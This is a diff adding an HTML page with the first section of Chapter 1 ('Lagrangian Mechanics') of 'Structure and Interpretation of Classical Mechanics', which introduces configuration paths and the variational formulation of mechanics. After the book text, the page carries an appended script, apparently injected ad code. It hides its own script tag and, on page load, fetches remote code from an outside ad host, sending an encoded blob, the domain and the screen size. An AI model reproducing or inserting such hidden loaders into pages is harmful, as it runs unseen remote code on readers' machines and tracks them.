@@ -1,0 +1,179 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-6.html">previous</a></span><span>, <a href="book-Z-H-8.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_chap_1"></a>
+<h1 class=chapter>
+<div class=chapterheading><a href="book-Z-H-4.html#%_toc_%_chap_1">Chapter 1</a></div><br>
+<a href="book-Z-H-4.html#%_toc_%_chap_1">Lagrangian Mechanics</a></h1>
+<p>
+<a name="%_idx_36"></a></p>
+<p>
+
+</p>
+
+<div align=right> 
+<table width=60%><tr><td>
+<span class=epigraph>
+
+<p>
+The purpose of mechanics is to describe how bodies change their
+position in space with ``time.''  I should load my conscience with
+grave sins against the sacred spirit of lucidity were I to formulate
+the aims of mechanics in this way, without serious reflection and
+detailed explanations.  Let us proceed to disclose these sins.</p>
+<p>
+<a name="%_idx_38"></a>Albert Einstein,
+<i>Relativity, the Special and General Theory</i> [<a href="book-Z-H-80.html#cite{Einstein}">16</a>], p.&nbsp;9</p>
+<p>
+</p>
+
+</span>
+</td></tr></table>
+</div>
+
+<p></p>
+<p>
+The subject of this book is motion and the mathematical tools used to
+describe it.</p>
+<p>
+Centuries of careful observations of the motions of the planets
+revealed regularities in those motions, allowing accurate predictions
+of phenomena such as eclipses and conjunctions.  The effort to
+formulate these regularities and ultimately to understand them led to
+the development of mathematics and to the discovery that mathematics
+could be effectively used to describe aspects of the physical world.
+That mathematics can be used to describe natural phenomena is a
+remarkable fact.</p>
+<p>
+A pin thrown by a juggler takes a rather predictable path and
+rotates in a rather predictable way.  In fact, the skill of
+juggling depends crucially on this predictability.  It
+is also a remarkable discovery that the same mathematical tools used
+to describe the motions of the planets can be used to describe the
+motion of the juggling pin.</p>
+<p>
+Classical mechanics describes the motion of a system of particles,
+subject to forces describing their interactions.  Complex physical
+objects, such as juggling pins, can be modeled as myriad particles
+with fixed spatial relationships maintained by stiff forces of
+interaction.</p>
+<p>
+There are many conceivable ways a system could move that never occur.
+We can imagine that the juggling pin might pause in midair or go
+fourteen times around the head of the juggler before being caught, but
+these motions do not happen.  How can we distinguish motions of a
+system that can actually occur from other conceivable motions?
+Perhaps we can invent some mathematical <a name="%_idx_40"></a>function that allows us to
+distinguish <a name="%_idx_42"></a>realizable motions from among all conceivable motions.</p>
+<p>
+The motion of a system can be described by giving the position of
+every piece of the system at each moment.  Such a description of the
+motion of the system is called a <a name="%_idx_44"></a><em>configuration path</em>; the
+configuration path specifies the configuration as a function of time.
+The juggling pin rotates as it flies through the air; the
+configuration of the juggling pin is specified by giving the position
+and orientation of the pin.  The motion of the juggling pin is
+specified by giving the position and orientation of the pin as a
+function of time.</p>
+<p>
+The function that we seek takes a configuration path as an input and
+produces some output.  We want this function to have
+some characteristic behavior when the input is a realizable path.
+For example, the output could be a number, and we could try to arrange
+that this number be zero only on realizable paths.  Newton's equations
+of motion are of this form; at each moment Newton's differential
+equations must be satisfied.</p>
+<p>
+However, there is an alternate strategy that provides more insight and
+power: we could look for a path-distinguishing function that has
+a minimum on the realizable paths -- on nearby unrealizable paths the
+value of the function is higher than it is on the realizable path.
+This is the <a name="%_idx_46"></a><em>variational strategy</em>: for each physical system we invent a
+path-distinguishing function that distinguishes realizable motions of
+the system by having a stationary point for each realizable path.<a name="call_footnote_Temp_8" href="#footnote_Temp_8"><sup><small>1</small></sup></a>
+For a great variety of systems
+realizable motions of the system can be formulated in terms of a
+variational principle.<a name="call_footnote_Temp_9" href="#footnote_Temp_9"><sup><small>2</small></sup></a> </p>
+<p>
+Mechanics, as invented by <a name="%_idx_50"></a>Newton and others of his era, describes the
+motion of a system in terms of the positions, velocities, and accelerations of
+each of the particles in the system.  In contrast to the <a name="%_idx_52"></a><a name="%_idx_54"></a>Newtonian
+formulation of mechanics, the variational formulation of mechanics
+describes the motion of a system in terms of aggregate quantities that
+are associated with the motion of the system as a whole.</p>
+<p>
+In the Newtonian formulation the forces can often be written as
+derivatives of the potential energy of the system.  The motion of the
+system is determined by considering how the individual component
+particles respond to these forces.  The Newtonian formulation of the
+equations of motion is intrinsically a particle-by-particle
+description.</p>
+<p>
+In the variational formulation the equations of motion are formulated
+in terms of the difference of the kinetic energy and the potential
+energy.  The potential energy is a number that is characteristic of
+the arrangement of the particles in the system; the kinetic energy is
+a number that is determined by the velocities of the particles in the
+system. Neither the potential energy nor the kinetic energy depends on
+how those positions and velocities are specified.  The difference is
+characteristic of the system as a whole and does not depend on the
+details of how the system is specified.  So we are free to choose ways
+of describing the system that are easy to work with; we are liberated
+from the particle-by-particle description inherent in the Newtonian
+formulation.</p>
+<p>
+The variational formulation has numerous advantages over the Newtonian
+formulation.  The equations of motion for those parameters that
+describe the state of the system are derived in the same way
+regardless of the choice of those parameters: the method of
+formulation does not depend on the choice of <a name="%_idx_56"></a>coordinate system.  If
+there are positional constraints among the particles of a system the
+Newtonian formulation requires that we consider the forces maintaining
+these constraints, whereas in the variational formulation the
+constraints can be built into the coordinates.  The variational
+formulation reveals the association of conservation laws with
+symmetries.  The variational formulation provides a framework for
+placing any particular motion of a system in the context of all
+possible motions of the system.  We pursue the variational
+formulation because of these advantages.</p>
+<p>
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_8" href="#call_footnote_Temp_8"><sup><small>1</small></sup></a> A <em>stationary point</em> of a function is a point where the
+<a name="%_idx_48"></a>  function's value does not vary as the input is varied.  Local maxima
+or minima are stationary points.</p>
+
+<p><a name="footnote_Temp_9" href="#call_footnote_Temp_9"><sup><small>2</small></sup></a> The variational formulation successfully describes 
+all of the Newtonian
+mechanics of particles and rigid bodies.  The variational formulation
+has also been usefully applied in the description of many other
+systems such as classical electrodynamics, the dynamics of inviscid
+fluids, and the design of mechanisms such as four-bar linkages.  In
+addition, modern formulations of quantum mechanics and quantum field
+theory build on many of the same concepts.  
+However, it appears that not all dynamical systems have a variational
+formulation.
+For example, there is no simple prescription to apply the
+variational apparatus to systems with dissipation, though in special
+cases variational methods can still be used.</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-6.html">previous</a></span><span>, <a href="book-Z-H-8.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD2sL7WTnKGaim%2fvku3G078aANxQcv7er3eVJaOAyJcBX9aHW0F1f8%2bLO3c%2brzYpmkPneYiarSZPudXtWOuG9iA53JvnIy8Fmj5D6VmBi0eeD8PhQqinkhxg4QF3gzhSPrJduTC1Dt9kgf6shWW3FYcVFo2tvzZ6fKA1LdYy6MRBWxFzga1NqQmhk535pjtAC7s%2bs8RkDjCXSMGXu9EuNJt%2bwGiRxbw4%2f6sg9rLp2JLQks9m%2bYw5quyy1cOU%2fQ0ND1CklUc8WQ1kqFyM%2bG5Eppr0uSQU2jIB8F1iPsEJzEsj5GufZABeXneQn8Y8p4UNlX49IZVbpQadXUhNoMEjBCiXFaE80%2fSbYsS%2fUrsUO2JjuKmW%2f8jUH9WW2IQ035QZj0dXAh82%2fXlf6dFNG%2bh%2b5XFsbX5MjFtY1FStBIW6jg63qQlzH1gPCUMi5NMVEixXf3ccetPNWOcDtvC6eRzCLtkJ");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
